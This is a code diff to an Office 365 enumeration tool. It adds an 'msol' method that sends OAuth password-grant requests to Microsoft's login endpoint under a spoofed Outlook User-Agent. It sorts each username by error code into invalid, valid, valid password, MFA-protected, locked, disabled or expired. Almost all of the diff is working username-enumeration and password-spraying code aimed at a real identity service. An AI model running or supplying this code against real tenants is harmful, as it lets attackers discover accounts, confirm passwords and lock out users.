@@ -163,9 +163,74 @@ def o365enum_office(usernames):
             exists = -1
         print("{},{}".format(username, int(exists)))
 
+def o365enum_msoloauth(usernames, url="https://login.microsoft.com"):
+    '''
+    Check if `usernames` exists using OAuthv2 "MSOLSpray" method by @dafthack:
+    https://github.com/dafthack/MSOLSpray
+
+    Args:
+        usernames(list): list of usernames to enumerate
+        url(string): Base URL to send request; Change to use proxies
+    '''
+    headers = {
+        "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro",
+        "Accept": "application/json",
+    }
+    body = {
+        "resource": "https://graph.windows.net",
+        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
+        "client_info": '1',
+        "grant_type": "password",
+        "username": "placeholder",
+        "password": args.password,
+        "scope": "openid"
+    }
+    codes = {
+        0: ['AADSTS50034'], # INVALID
+        1: ['AADSTS50126'], # VALID
+        3: ['AADSTS50079', 'AADSTS50076'], # MSMFA
+        4: ['AADSTS50158'], # OTHER MFA
+        5: ['AADSTS50053'], # LOCKED
+        6: ['AADSTS50057'], # DISABLED
+        7: ['AADSTS50055'], # EXPIRED
+        8: ['AADSTS50128', 'AADSTS50059'], # INVALID TENANT
+    }
+
+    for username in usernames:
+        state = -1
+        body['username'] = username
+        response = requests.post(
+            url + '/common/oauth2/token',
+            headers=headers,
+            data=body
+        )
+
+        # States
+        # 0 = invalid user
+        # 1 = valid user
+        # 2 = valid user/pass
+        # 3 = MS MFA response
+        # 4 = third-party MFA?
+        # 5 = locked out
+        # 6 = acc disabled
+        # 7 = pwd expired
+        # 8 = invalid tenant response
+        if response.status_code == 200:
+            state = 2
+        else:
+            respErr = response.json()['error_description']
+            for k, v in codes.items():
+                if any(e in respErr for e in v):
+                    state = k
+                    break
+            if state == -1:
+                logging.info(f"UNKERR: {respErr}")
+        print("{},{}".format(username, state))
+
+
 def o365enum(usernames, method="activesync"):
     '''
-    Enumerate usernames using either ActiveSync or Office.com.
+    Enumerate usernames using an available method
     '''
     print("username,valid")
     if method == "activesync":
@@ -174,6 +239,8 @@ def o365enum(usernames, method="activesync"):
         o365enum_autodiscover(usernames)
     elif method == "office.com":
         o365enum_office(usernames)
+    elif method == "msol":
+        o365enum_msoloauth(usernames)
     else:
         raise Exception("Invalid method provided.")
 
@@ -191,7 +258,7 @@ if __name__ == "__main__":
     parser.add_argument('-v', '--verbose', default=False, action='store_true',\
         help='Enable verbose output at urllib level')
     parser.add_argument('-m', '--method', default='activesync', type=str,\
-        choices=('activesync', 'autodiscover', 'office.com'),\
+        choices=('activesync', 'autodiscover', 'office.com', 'msol'),\
         help='method to use')
     args = parser.parse_args()
 
